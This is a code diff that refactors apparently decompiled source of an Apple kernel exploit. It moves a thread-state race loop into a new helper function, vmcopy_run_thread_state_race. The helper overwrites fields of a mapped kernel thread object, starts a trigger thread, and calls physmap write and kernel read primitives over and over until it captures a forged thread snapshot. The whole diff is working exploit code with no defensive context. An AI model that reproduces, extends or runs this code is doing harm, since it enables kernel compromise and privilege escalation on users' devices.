@@ -156,6 +156,8 @@ typedef struct VmcopyTriggerThreadBlock
 
 enum
 {
+  VMCOPY_KREAD_CTX_OFFSET = 8,
+  VMCOPY_MAPPED_THREAD_OBJECT_OFFSET = 24,
   VMCOPY_TARGET_THREAD_KADDR_OFFSET = 360,
   VMCOPY_CHILD_THREAD_KADDR_OFFSET = 376,
   VMCOPY_FAKE_THREAD_STATE_OFFSET = 384,
@@ -166,6 +168,7 @@ enum
   VMCOPY_FAKE_MARKER_OFFSET = 616,
   VMCOPY_FAKE_MARKER2_OFFSET = 640,
   VMCOPY_FAKE_FLAGS_OFFSET = 652,
+  VMCOPY_THREAD_POLICY_BITS_OFFSET = 656,
   VMCOPY_FAKE_CONTINUATION_OFFSET = 552,
   VMCOPY_MESSAGE_KADDR_OFFSET = 664,
   VMCOPY_CAPTURED_THREAD_OFFSET = 672,
@@ -358,6 +361,65 @@ static inline void vmcopy_prime_fake_message_pages(__int64 kreadCtx, uint64_t me
 
   for ( int64_t pageOffset = -0x4000; pageOffset < 0x8000; pageOffset += 0x4000 )
     flush_cpu_cache(kreadCtx, messageKaddr + pageOffset + 0x8000, (int)(pageOffset + VMCOPY_MARKER32));
+}
+
+static inline uint64_t vmcopy_run_thread_state_race(
+        __int64 state,
+        const __int128 savedThreadObject[19],
+        VmcopyWritePhysmapBlock *writePhysmapBlock,
+        semaphore_t readySemaphore,
+        semaphore_t resumeSemaphore,
+        uint64_t baselineNext,
+        uint64_t replacementNext,
+        uint64_t originalNext,
+        uint64_t threadKaddr)
+{
+  while ( 1 )
+  {
+    pthread_t triggerThread = 0;
+    __int64 triggerState = 0;
+    VmcopyTriggerThreadBlock triggerThreadBlock;
+
+    memcpy(*(void **)(state + VMCOPY_MAPPED_THREAD_OBJECT_OFFSET), savedThreadObject, 0x130u);
+    vmcopy_init_trigger_thread_block(&triggerThreadBlock, state, &triggerState, readySemaphore, resumeSemaphore);
+    pthread_create(&triggerThread, 0, (void *(__cdecl *)(void *))call_vtable_ptr_slot2, &triggerThreadBlock);
+    semaphore_wait(resumeSemaphore);
+    semaphore_signal(readySemaphore);
+
+    uint64_t mappedThreadObject = *(uint64_t *)(state + VMCOPY_MAPPED_THREAD_OBJECT_OFFSET);
+    *(uint64_t *)(mappedThreadObject + 240) = 0;
+    writePhysmapBlock->invoke((__int64)writePhysmapBlock, 8u);
+
+    triggerState = 1;
+    uint32_t *threadPolicyBits = (uint32_t *)(mappedThreadObject + 272);
+    uint64_t *threadNext = (uint64_t *)(mappedThreadObject + 296);
+    uint64_t *triggered = (uint64_t *)(mappedThreadObject + 240);
+    uint32_t policyBits = *(uint32_t *)(state + VMCOPY_THREAD_POLICY_BITS_OFFSET);
+    do
+    {
+      *threadPolicyBits = policyBits;
+      *threadNext = replacementNext;
+    }
+    while ( !*triggered );
+
+    writePhysmapBlock->invoke((__int64)writePhysmapBlock, 1u);
+    pthread_join(triggerThread, 0);
+
+    uint64_t observedNext = kread_u64_value(
+                              *(uint64_t *)(state + VMCOPY_KREAD_CTX_OFFSET),
+                              threadKaddr + 296);
+    if ( observedNext != baselineNext && observedNext != replacementNext && observedNext != originalNext )
+    {
+      uint64_t snapshot = *(uint64_t *)(state + VMCOPY_MAPPED_THREAD_OBJECT_OFFSET);
+      if ( *(uint32_t *)(snapshot + 272) == *(uint32_t *)(state + VMCOPY_THREAD_POLICY_BITS_OFFSET)
+        && observedNext
+        && *(uint64_t *)(snapshot + 264) == *(uint64_t *)(state + VMCOPY_FAKE_MARKER2_OFFSET)
+        && *(uint64_t *)(snapshot + 248) == *(uint64_t *)(state + VMCOPY_FAKE_WAIT_LINK_OFFSET) )
+      {
+        return snapshot;
+      }
+    }
+  }
 }
 
 static inline void vmcopy_patch_memory_entry_page(__int64 kreadCtx, __int64 pageInfoKaddr, uint32_t ppnum, __int128 scratch[2])
@@ -7990,13 +8052,6 @@ __int64 __fastcall exploit_thread_vmcopy_race(__int64 someStruct)
   __int64 v75; // x0
   mach_vm_address_t v76; // x1
   __int64 v78; // x25
-  __int64 v79; // x8
-  uint32_t *v80; // x9
-  uint64_t *v81; // x10
-  uint64_t *v82; // x8
-  int v83; // w11
-  __int64 v84; // x0
-  __int64 v85; // x1
   mach_msg_header_t *v86; // x0
   vm_offset_t v87; // x22
   __int64 v88; // x24
@@ -8021,7 +8076,6 @@ __int64 __fastcall exploit_thread_vmcopy_race(__int64 someStruct)
   vm_offset_t v108; // [xsp+F0h] [xbp-610h]
   unsigned __int64 v109; // [xsp+F8h] [xbp-608h]
   vm_address_t v110; // [xsp+100h] [xbp-600h] BYREF
-  VmcopyTriggerThreadBlock triggerThreadBlock; // [xsp+108h] [xbp-5F8h] BYREF
   natural_t suspendedThreadState[0x44]; // [xsp+140h] [xbp-5C0h] BYREF
   VmcopyWritePhysmapBlock writePhysmapBlock; // [xsp+250h] [xbp-4B0h] BYREF
   vm_address_t v144; // [xsp+2B8h] [xbp-448h] BYREF
@@ -8301,44 +8355,17 @@ LABEL_68:
     thread_set_state(*(uint32_t *)(someStruct + 672), 6, suspendedThreadState, 0x44u);
     kread_u64_value(*(uint64_t *)(someStruct + 8), v100 + 296);
     kread_u32_value(*(uint64_t *)(someStruct + 8), v101);
-    while ( 1 )
-    {
-      memcpy(*(void **)(someStruct + 24), __dst, 0x130u);
-      v150 = 0;
-      vmcopy_init_trigger_thread_block(&triggerThreadBlock, someStruct, &v150, v160, semaphore);
-      pthread_create(&v149, 0, (void *(__cdecl *)(void *))call_vtable_ptr_slot2, &triggerThreadBlock);
-      semaphore_wait(semaphore);
-      semaphore_signal(v160);
-      *(uint64_t *)(*(uint64_t *)(someStruct + 24) + 240LL) = 0;
-      writePhysmapBlock.invoke((__int64)&writePhysmapBlock, 8u);
-      v150 = 1;
-      v79 = *(uint64_t *)(someStruct + 24);
-      v80 = (uint32_t *)(v79 + 272);
-      v81 = (uint64_t *)(v79 + 296);
-      v82 = (uint64_t *)(v79 + 240);
-      v83 = *(uint32_t *)(someStruct + 656);
-      do
-      {
-        *v80 = v83;
-        *v81 = v48;
-      }
-      while ( !*v82 );
-      writePhysmapBlock.invoke((__int64)&writePhysmapBlock, 1u);
-      pthread_join(v149, 0);
-      v84 = kread_u64_value(*(uint64_t *)(someStruct + 8), v100 + 296);
-      if ( v84 != v78 && v84 != v48 && v84 != v41 )
-      {
-        v85 = *(uint64_t *)(someStruct + 24);
-        if ( *(uint32_t *)(v85 + 272) == *(uint32_t *)(someStruct + 656)
-          && v84
-          && *(uint64_t *)(v85 + 264) == *(uint64_t *)(someStruct + 640)
-          && *(uint64_t *)(v85 + 248) == *(uint64_t *)(someStruct + 624) )
-        {
-          break;
-        }
-      }
-    }
-    memcpy(v94, (const void *)v85, 0x130u);
+    uint64_t capturedSnapshot = vmcopy_run_thread_state_race(
+                                  someStruct,
+                                  __dst,
+                                  &writePhysmapBlock,
+                                  v160,
+                                  semaphore,
+                                  v78,
+                                  v48,
+                                  v41,
+                                  v100);
+    memcpy(v94, (const void *)capturedSnapshot, 0x130u);
     kread_u64_value(*(uint64_t *)(someStruct + 8), *(uint64_t *)(someStruct + 360) + 296LL);
     mach_port_allocate(mach_task_self_, 1u, (mach_port_name_t *)(someStruct + 368));
     mach_port_insert_right(mach_task_self_, *(uint32_t *)(someStruct + 368), *(uint32_t *)(someStruct + 368), 0x14u);
